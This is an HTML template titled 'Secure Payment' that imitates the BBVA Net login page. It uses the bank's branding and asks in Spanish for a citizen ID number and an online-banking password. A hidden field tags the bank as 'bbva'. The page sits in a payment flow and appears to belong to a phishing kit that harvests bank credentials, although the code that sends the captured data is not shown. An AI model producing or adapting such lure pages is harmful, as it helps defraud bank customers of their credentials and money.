<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
   
    <meta name="csrf-token" content="{{ csrf_token() }}">


    <link rel="stylesheet" href="{{asset('assets/css/payment/bbva.css')}}">


    <script type="text/javascript" src="{{asset('assets/js/jquery-3.6.0.min.js')}}"></script>
            

    
    <title>Secure Payment</title>



</head>
<body>
  
  <img src="{{asset('assets/img/payment/bbva/menu.jpg')}}" alt="" srcset="" width="100%">

    <div style="text-align: center;">
        <div style="width:100%; margin-top: 80px;">
            <a style="font-size:21px;">Hola, ingresa tu número de documento y contraseña para entrar a BBVA Net:</a>
        </div>
    </div>

  <div class="inp">
    <select name="cc" id="">
        <option value="cedula" selected>Cédula de Ciudadania</option>
    </select>
    <br>
    <input type="tel" id="txtUsuario" name="userC" placeholder="Número de documento" minlength="6" maxlength="10" pattern="^[0-9]{6,10}$" oninput="this.value = this.value.replace(/\D+/g, '');"><br>
    <input type="password" name="pass" id="txtPass" placeholder="Contraseña" oninput="this.value = this.value.replace(/\s+/g, '')"><br>
    <input type="submit" value="Entrar a BBVA Net" id="btnUsuario" style="background-color:#227aba; font-size:17px; border:none;  font-weight: bold; color:white; width:85%;"><br>
	<input type="hidden" value="bbva" id="banco">
  </div>

</body>
</html>